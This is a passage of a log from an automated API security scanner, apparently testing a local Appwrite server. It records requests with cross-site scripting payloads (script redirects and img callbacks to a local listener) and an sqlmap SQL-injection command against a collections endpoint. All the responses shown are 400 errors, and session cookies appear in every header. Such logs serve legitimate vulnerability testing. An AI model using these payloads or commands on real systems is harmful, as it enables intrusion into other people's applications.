+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'name': "<script>window.location='http://192.168.1.118:4444/xss/avatars/initialsVoAPIname'</script>", 'width': 22, 'height': 4, 'color': 'VoAPITestString37', 'background': 'VoAPITestString6'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39575a0130>]
+/avatars/qr Get
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'display_api': ['text']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/qr
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'text': "<img src='http://192.168.1.118:4444/xss/avatars/qrVoAPItext'>", 'size': 43, 'margin': 4, 'download': False}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/qr
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'text': "<img src='https://192.168.1.118:4445/xss/avatars/qrVoAPItext'>", 'size': 34, 'margin': 4, 'download': False}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/qr
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'text': "<script>window.location='http://192.168.1.118:4444/xss/avatars/qrVoAPItext'</script>", 'size': 24, 'margin': 4, 'download': True}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957641730>, <VoAPITemplate.ApiTemplate object at 0x7f3957645040>]
+/database/collections Post
+/database/collections Get
+candidate_api_seq_relations: ---------------
+producer_api: /database/collections Post
+producer_param: type
+consumer_api: /database/collections Get
+consumer_param: orderType
+------------
+candidate_api_test_types: {'database_api': ['search', 'orderType'], 'display_api': ['search', 'orderType']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString19', 'read': ['VoAPITestString0'], 'rules': [], 'write': ['VoAPITestString31']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957641730>]
+/database/collections Post
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'database_api': ['name'], 'display_api': ['name']}
+---------------------SQLMap Test: Wed Nov 26 21:32:40 2025-------------------
+sqlmap_cmd: python  -u "http://192.168.1.118/v1/database/collections" --method="Post" --headers="Content-Type:application/json\nX-Appwrite-Project:6535db029948e\nX-Appwrite-Mode:admin\nCookie:_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1" --data="name=VoAPITestString21;read=['VoAPITestString30'];rules=[];write=['VoAPITestString28']" --param-del=";" -p "name" --batch --smart
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<img src='http://192.168.1.118:4444/xss/database/collectionsVoAPIname'>", 'read': ['VoAPITestString36'], 'rules': [], 'write': ['VoAPITestString16']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<img src='https://192.168.1.118:4445/xss/database/collectionsVoAPIname'>", 'read': ['VoAPITestString16'], 'rules': [], 'write': ['VoAPITestString43']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<script>window.location='http://192.168.1.118:4444/xss/database/collectionsVoAPIname'</script>", 'read': ['VoAPITestString13'], 'rules': [], 'write': ['VoAPITestString38']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957641730>, <VoAPITemplate.ApiTemplate object at 0x7f395716ba00>]
+/database/collections Post
+/database/collections/{collectionId} Put
+candidate_api_seq_relations: ---------------
+producer_api: /database/collections Post
+producer_param: $id
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: collectionId
+------------
+producer_api: /database/collections Post
+producer_param: name
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'database_api': ['name'], 'display_api': ['name']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString14', 'read': ['VoAPITestString7'], 'rules': [], 'write': ['VoAPITestString2']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957641730>, <VoAPITemplate.ApiTemplate object at 0x7f395716ba00>, <VoAPITemplate.ApiTemplate object at 0x7f395809a8b0>, <VoAPITemplate.ApiTemplate object at 0x7f395bd49940>]
+/database/collections Post
+/database/collections/{collectionId} Put
+/database/collections/{collectionId}/documents Post
+/database/collections/{collectionId}/documents Get
+candidate_api_seq_relations: ---------------
+producer_api: /database/collections/{collectionId}/documents Post
+producer_param: $id
+consumer_api: /database/collections/{collectionId}/documents Get
+consumer_param: collectionId
+------------
+producer_api: /database/collections/{collectionId} Put
+producer_param: type
+consumer_api: /database/collections/{collectionId}/documents Get
+consumer_param: orderType
+------------
+producer_api: /database/collections/{collectionId} Put
+producer_param: $id
+consumer_api: /database/collections/{collectionId}/documents Post
+consumer_param: collectionId
+------------
+producer_api: /database/collections/{collectionId} Put
+producer_param: type
+consumer_api: /database/collections/{collectionId}/documents Post
+consumer_param: parentPropertyType
+------------
+producer_api: /database/collections Post
+producer_param: $id
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: collectionId
+------------
+producer_api: /database/collections Post
+producer_param: name
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'database_api': ['orderField'], 'display_api': ['orderField', 'orderType', 'orderCast', 'search']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString12', 'read': ['VoAPITestString18'], 'rules': [], 'write': ['VoAPITestString22']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957641730>, <VoAPITemplate.ApiTemplate object at 0x7f395716ba00>, <VoAPITemplate.ApiTemplate object at 0x7f395809a8b0>]
+/database/collections Post
+/database/collections/{collectionId} Put
+/database/collections/{collectionId}/documents Post
+candidate_api_seq_relations: ---------------
+producer_api: /database/collections/{collectionId} Put
+producer_param: $id
+consumer_api: /database/collections/{collectionId}/documents Post
+consumer_param: collectionId
+------------
+producer_api: /database/collections/{collectionId} Put
+producer_param: type
+consumer_api: /database/collections/{collectionId}/documents Post
+consumer_param: parentPropertyType
+------------
+producer_api: /database/collections Post
+producer_param: $id
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: collectionId
+------------
+producer_api: /database/collections Post
+producer_param: name
+consumer_api: /database/collections/{collectionId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'database_api': ['parentDocument', 'parentProperty', 'parentPropertyType'], 'display_api': ['parentDocument', 'parentProperty', 'parentPropertyType']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/database/collections
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; 